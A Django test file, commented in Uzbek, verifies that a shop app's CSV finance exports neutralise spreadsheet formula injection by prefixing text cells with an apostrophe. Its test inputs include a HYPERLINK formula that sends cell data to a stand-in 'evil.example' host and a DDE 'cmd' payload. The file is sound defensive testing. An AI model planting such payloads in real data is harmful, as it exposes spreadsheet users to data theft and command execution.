"""
CSV formula injection (P2.2). Excel/LibreOffice `=`, `+`, `-`, `@`, TAB yoki CR bilan boshlangan katakni formula deb
bajaradi (`=HYPERLINK(...)` orqali ma'lumot o'g'irlash, DDE). Matnli ustunlarda bunday qiymatning oldiga `'` qo'yiladi;
RAQAMLI ustunlarga (ID, summa) tegilmaydi. BOM va ustun tartibi o'zgarmaydi.
"""
import csv
import io
from decimal import Decimal

from django.core.management import call_command
from django.test import Client, TestCase, override_settings

from accounts.models import AdminUser
from backend.csv_safety import csv_text
from finance.models import FinanceCategory, FinanceTransaction
from orders.models import Order
from orders.timeutils import local_today
from shops.models import Shop

EVIL = '=HYPERLINK("http://evil.example/steal?c="&A1,"Bosing")'


class CsvTextHelperTests(TestCase):

    def test_formula_prefixes_are_neutralised(self):
        for bad in ('=1+1', '+998901234567', '-2+3', '@SUM(A1)', '\t=1', '\r=1', EVIL, '=cmd|\' /C calc\'!A0'):
            self.assertEqual(csv_text(bad), "'" + bad, repr(bad))

    def test_normal_text_and_empty_values_are_unchanged(self):
        for ok in ('Savdo: Stol #5', 'Osh (plov)', '', ' =bo\'sh joydan keyin', "O'zbek", '5 kg'):
            self.assertEqual(csv_text(ok), ok)
        self.assertEqual(csv_text(None), '')

    def test_numbers_are_not_touched_by_callers_but_helper_stringifies_safely(self):
        # Raqamli ustunlar csv_text dan o'tkazilmaydi; o'tkazilsa ham musbat son o'zgarmaydi
        self.assertEqual(csv_text(150000), '150000')


@override_settings(ROOT_URLCONF='backend.urls_restaurant',
                   ALLOWED_HOSTS=['localhost', '127.0.0.1', 'testserver', '.example.com'])
class CsvExportInjectionTests(TestCase):

    def setUp(self):
        call_command('create_restaurant', name='Csv Xavfsiz', slug='csv-xavfsiz', owner='csv-xavfsiz-ega',
                     password='Parol-Csv-123', tables=1, stdout=io.StringIO())
        self.shop = Shop.objects.get(slug='csv-xavfsiz')
        self.owner = AdminUser.objects.get(username='csv-xavfsiz-ega')
        self.owner.is_approved = True
        self.owner.first_name, self.owner.last_name = '@SUM(1+1)', 'Xodim'
        self.owner.save(update_fields=['is_approved', 'first_name', 'last_name'])
        self.cat = FinanceCategory.objects.create(shop=self.shop, name='+Kategoriya', category_type='income')
        order = Order.objects.create(order_number='-ORD-1', shop=self.shop, customer_name=EVIL,
                                     total_amount=Decimal('1000'), final_amount=Decimal('1000'))
        self.tx = FinanceTransaction.objects.create(
            shop=self.shop, category=self.cat, tx_type='income', stage='income', amount=Decimal('12345'),
            payment_method='cash', title=EVIL, notes='=1+1', cancel_reason='-1+1', order=order,
            tx_date=local_today(), created_by=self.owner)
        self.client = Client()
        self.client.force_login(self.owner)

    def _rows(self, response):
        self.assertEqual(response.status_code, 200)
        raw = response.content
        self.assertTrue(raw.startswith(b'\xef\xbb\xbf'))
        self.assertEqual(raw.count(b'\xef\xbb\xbf'), 1)
        return list(csv.reader(io.StringIO(raw.decode('utf-8-sig'))))

    def _assert_no_formula_cell(self, rows):
        for row in rows[1:]:
            for cell in row:
                self.assertFalse(cell[:1] in ('=', '+', '@', '\t', '\r'), f'formula katak: {cell!r}')
                # "-" bilan boshlangan matn katagi ham formula; raqamli summa ustuni bundan mustasno (quyida alohida)
        return rows

    def test_admin_api_export_neutralises_text_columns_and_keeps_layout(self):
        res = self.client.get('/api/restaurant/admin/v1/finance/export.csv')
        rows = self._rows(res)
        self.assertEqual(rows[0], ['ID', 'Sana', 'Tranzaksiya', 'Turi', 'Kategoriya', "Summa (so'm)", "To'lov Usuli",
                                   'Holati', 'Bekor Qilish Sababi'])
        row = rows[1]
        self.assertEqual(row[0], str(self.tx.id))                 # raqamli ustun o'zgarmagan
        self.assertEqual(row[2], "'" + EVIL)                      # mazmun
        self.assertEqual(row[4], "'+Kategoriya")                  # kategoriya
        self.assertEqual(row[5], '12345')                         # summa — raqam
        self.assertEqual(row[8], "'-1+1")                         # bekor qilish sababi
        self._assert_no_formula_cell(rows)

    def test_seller_export_neutralises_text_columns_and_keeps_layout(self):
        res = self.client.get('/seller/finance/export/excel/', HTTP_HOST='csv-xavfsiz.example.com')
        rows = self._rows(res)
        self.assertEqual(rows[0][:4], ['ID', 'Sana', 'Buyurtma №', 'Bosqich (Holati)'])
        self.assertEqual(len(rows[0]), 12)
        row = rows[1]
        self.assertEqual(row[2], "'-ORD-1")                       # buyurtma raqami
        self.assertEqual(row[5], "'+Kategoriya")
        self.assertEqual(row[6], "'" + EVIL)                      # mazmun
        self.assertEqual(row[7], '12345.00')                      # summa — raqam, o'zgarmagan
        self.assertEqual(row[9], "'=1+1")                         # izoh
        self.assertEqual(row[10], "'@SUM(1+1) Xodim")             # kiritgan xodim
        self._assert_no_formula_cell(rows)

    def test_guest_name_inside_auto_note_stays_unchanged(self):
        """Mehmon ismi avtomatik izohning o'rtasida (katak boshida emas): formula emas, shuning uchun o'zgartirilmaydi."""
        note = f'Avtomatik kassa tushumi: ORD-1 ({EVIL})'
        FinanceTransaction.objects.filter(pk=self.tx.pk).update(
            title='Savdo: Stol #1', notes=note, cancel_reason='')
        FinanceCategory.objects.filter(pk=self.cat.pk).update(name='Taomlar')
        Order.objects.filter(order_number='-ORD-1').update(order_number='ORD-1')
        AdminUser.objects.filter(pk=self.owner.pk).update(first_name='Ega', last_name='Xodim')
        rows = self._assert_no_formula_cell(self._rows(self.client.get('/api/restaurant/admin/v1/finance/export.csv')))
        self.assertNotIn(note, [c for c in rows[1] if c.startswith("'")])
        rows = self._assert_no_formula_cell(self._rows(
            self.client.get('/seller/finance/export/excel/', HTTP_HOST='csv-xavfsiz.example.com')))
        self.assertEqual(rows[1][9], note)
